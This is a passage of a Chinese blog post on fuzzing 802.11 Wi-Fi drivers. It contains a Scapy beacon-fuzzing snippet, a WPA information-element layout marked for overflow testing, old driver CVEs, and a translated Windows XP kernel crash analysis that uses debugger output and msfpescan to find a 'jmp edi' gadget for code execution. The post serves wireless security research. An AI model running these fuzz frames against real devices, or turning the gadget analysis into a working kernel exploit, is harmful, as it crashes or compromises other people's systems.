    For SSID, test fuzz ssid {0, 1, MIN-1, MIN, MIN+1, MAX-1, MAX, MAX+1,
    254, 255} length
长度值可能是有用的，以触发缓冲区溢出，如果不仔细检查的执行过程中的分析过程中的
802.11帧。这些信息大部分元素最小、固定或极大值可以不同于字节边界(0-255byte)。
发送帧只有Beacon Frames的信息不一定是802.11中制定的元素，这个是为了测试Driver是否能在Beacon中解析有用无用的信息。
SSID的information elements Random
frame = Dot11( proto=0,FCfield=0,ID=0,addr1=DST,addr2=BSSID,
addr3=BSSID,SC=0,addr4=None)
/Dot11Beacon(beacon_interval=100,cap="ESS")
/Dot11Elt(ID=0)
sendp(fuzz(frame), loop=1)
老外的这一个框架，什么都明白了就。
必须要知道解析器通常检查哪些信息元素，了解底层协议那是肯定的.例如WPA的information elements
WPA IE (1 byte)
WPA OUI (3 bytes)
WPA TYPE (1 byte) + WPA VERSION (2 bytes)
WPA multicast cipher (4 bytes)
Number of unicast ciphers (2 bytes: m value)
WPA list of unicast ciphers (4*m bytes)
Number of authentication suites (2 bytes: n value)
WPA list of authentication suites (4 * n bytes)
**当Fuzzer开始执行的时候，你可以用不同的“m”和“n”值来检查溢出•截断这些帧并且填充一些不相关的值来测试。**
其实呢，我还是觉得，有了方法和思路，根据自己的Idea去Fuzzing比什么都要好，有个叫wifuzzit的框架：
[https://github.com/bullo95/WiFi–/tree/master/wifuzzit](https://github.com/bullo95/WiFi--/tree/master/wifuzzit)
挺好的，也发现了一些溢出的CVE等：
[CVE-2008-1144年](https://translate.googleusercontent.com/translate_c?depth=1&hl=zh-CN&rurl=translate.google.com&sl=en&tl=zh-CN&u=http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-1144&usg=ALkJrhgvuTduhqui0rxa8HTvcLqWadpbrg)
：Marvell的驱动EAPOL-密钥长度溢出（无线AP）
[CVE-2007-5474](https://translate.googleusercontent.com/translate_c?depth=1&hl=zh-CN&rurl=translate.google.com&sl=en&tl=zh-CN&u=http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-5474&usg=ALkJrhgnELTTb5APKsN8je618sbeLKPbCA)
：Atheros的供应商特定信息元素溢出（无线AP）
[CVE-2007-0933](https://translate.googleusercontent.com/translate_c?depth=1&hl=zh-CN&rurl=translate.google.com&sl=en&tl=zh-CN&u=http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-0933&usg=ALkJrhgqfql3jP1-cxEzuLzw2iUfQQ-7fw)
：缓冲区溢出在无线驱动程序6.0.0.18的的D-Link DWL-G650 +（无线STA）
[CVE-2007-5651](https://translate.googleusercontent.com/translate_c?depth=1&hl=zh-CN&rurl=translate.google.com&sl=en&tl=zh-CN&u=http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-5651&usg=ALkJrhik-pWdSegiQbqAw2WrFO1HYMFfig)
：可扩展身份验证协议漏洞（Cisco的无线AP与有线交换机）
[CVE-2007-5475](https://translate.googleusercontent.com/translate_c?depth=1&hl=zh-CN&rurl=translate.google.com&sl=en&tl=zh-CN&u=http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-5475&usg=ALkJrhhPFlsR9dMxuYPuPC7exCl7NUkqOQ)
：Marvell的驱动多个信息元素溢出（无线AP）
**三、Windows** **上的Driver** ******Vulnerabilities**
****
其实关于Kernel的漏洞，只要你对Madwifi，无线协议比较清楚的话，再熟悉一些MIPS ,ARM指令就能看懂…注意是读懂，读懂不代表你也能挖出来。
差点把Google炸了才翻出一篇比较老的文章，专门写kernel的，我把主要地方给翻译下贴过来吧，前面讲协议的我看得懂可以分析下，这个后面涉及到内核的我也分析不了，做二进制的有这方面的需求的，可以看下：
最开始他也是提了802.11 Driver
的State，也是说根据State1Fuzzing来的思路，前面噼里啪啦说的跟我前面一样，我直接就贴他后面的漏洞分析。
一个DWL-G132 USB A5AGU.SYS在WINxp下的测试：结果是造成内核崩溃
    DRIVER_IRQL_NOT_LESS_OR_EQUAL (d1)
    An attempt was made to access a pageable (or completely invalid) address at an
    interrupt request level (IRQL) that is too high.  This is usually
    caused by drivers using improper addresses.
    If kernel debugger is available get stack backtrace.
    Arguments:
    Arg1: 56149a1b, memory referenced
    Arg2: 00000002, IRQL
    Arg3: 00000000, value 0 = read operation, 1 = write operation
    Arg4: 56149a1b, address which referenced memory
    ErrCode = 00000000
    eax=00000000 ebx=82103ce0 ecx=00000002 edx=82864dd0 esi=f24105dc edi=8263b7a6
    eip=56149a1b esp=80550658 ebp=82015000 iopl=0         nv up ei ng nz ac pe nc
    cs=0008  ss=0010  ds=0023  es=0023  fs=0030  gs=0000             efl=00010296
    56149a1b ??              ???
    Resetting default scope
    LAST_CONTROL_TRANSFER:  from 56149a1b to 804e2158
    FAILED_INSTRUCTION_ADDRESS: 
    +56149a1b
    56149a1b ??              ???
    STACK_TEXT:  
    805505e4 56149a1b badb0d00 82864dd0 00000000 nt!KiTrap0E+0x233
    80550654 82015000 82103ce0 81f15e10 8263b79c 0x56149a1b
    80550664 f2408d54 81f15e10 82103c00 82015000 0x82015000
    80550694 f24019cc 82015000 82103ce0 82015000 A5AGU+0x28d54
    805506b8 f2413540 824ff008 0000000b 82015000 A5AGU+0x219cc
    805506d8 f2414fae 824ff008 0000000b 0000000c A5AGU+0x33540
    805506f4 f24146ae f241d328 8263b760 81f75000 A5AGU+0x34fae
    80550704 f2417197 824ff008 00000001 8263b760 A5AGU+0x346ae
    80550728 804e42cc 00000000 821f0008 00000000 A5AGU+0x37197
    80550758 f74acee5 821f0008 822650a8 829fb028 nt!IopfCompleteRequest+0xa2
    805507c0 f74adb57 8295a258 00000000 829fb7d8 USBPORT!USBPORT_CompleteTransfer+0x373
    805507f0 f74ae754 026e6f44 829fb0e0 829fb0e0 USBPORT!USBPORT_DoneTransfer+0x137
    80550828 f74aff6a 829fb028 804e3579 829fb230 USBPORT!USBPORT_FlushDoneTransferList+0x16c
    80550854 f74bdfb0 829fb028 804e3579 829fb028 USBPORT!USBPORT_DpcWorker+0x224
    80550890 f74be128 829fb028 00000001 80559580 USBPORT!USBPORT_IsrDpcWorker+0x37e
    805508ac 804dc179 829fb64c 6b755044 00000000 USBPORT!USBPORT_IsrDpc+0x166
    805508d0 804dc0ed 00000000 0000000e 00000000 nt!KiRetireDpcList+0x46
    805508d4 00000000 0000000e 00000000 00000000 nt!KiIdleLoop+0x26
Fuzz的五秒钟已产生一个缺陷，已经可能对指针进行控制。
为了执行任意代码，然而，一个恶意框架必须定位。在这种情况下，在`EDI`寄存器所指向成一样的方式，它在Broadcom漏洞做了帧的源地址字段。
随机生成信息元素之一-假`EIP`值到源地址。
    kd> dd 0x8263b7a6 (edi)
    8263b7a6  f3793ee8 3ee8a34e a34ef379 6eb215f0
    8263b7b6  fde19019 006431d8 9b001740 63594364
    kd> s 0x8263b7a6 Lffff 0x1b 0x9a 0x14 0x56
    8263bd2b  1b 9a 14 56 2a 85 56 63-00 55 0c 0f 63 6e 17 51  ...V*.Vc.U..cn.Q
下一步是确定哪些信息元素是Crash的原因。 解码后的内存Frame进行了一系列的修直到导致崩溃的特定信息元素被发现。
通过这种方法，确定了溢出的存在利用这个漏洞涉及发现内存中的返回地址指向一个JMP EDI，EDI ，或推电子数据交换;
ret指令序列。这是通过运行msfpescan应用程序中包含的ntoskrnl Metasploit框架。
所得的地址必须被调整以考虑内核的基址。ntoskrnl.exe中的地址是0x804f16eb（0x800d7000 + 0x0041a6eb）
    $ msfpescan ntoskrnl.exe -j edi
    [ntoskrnl.exe]
    0x0040365d push edi; retn 0x0001
    0x00405aab call edi
    0x00409d56 push edi; ret
    0x0041a6eb jmp edi
实在找不出比这更新的研究内容了，关于国外针对802.11
Fuzz的研究也停滞在了11年。阅读了大约30多份洋码子PDF与PPT以及学术论文，综合写下，有点辛苦…..不管研究不研究，只想让大家明白存在这么一种技术，它的原理是这样，也希望在中文引擎的搜索上，出现关于这一技术的研究内容，如果你也恰好研究过，发现了那里不妥或者出现了错误或者是有更好的方法，欢迎交流指正。上来就喷的，你也放心，我一定会给你喷回去的。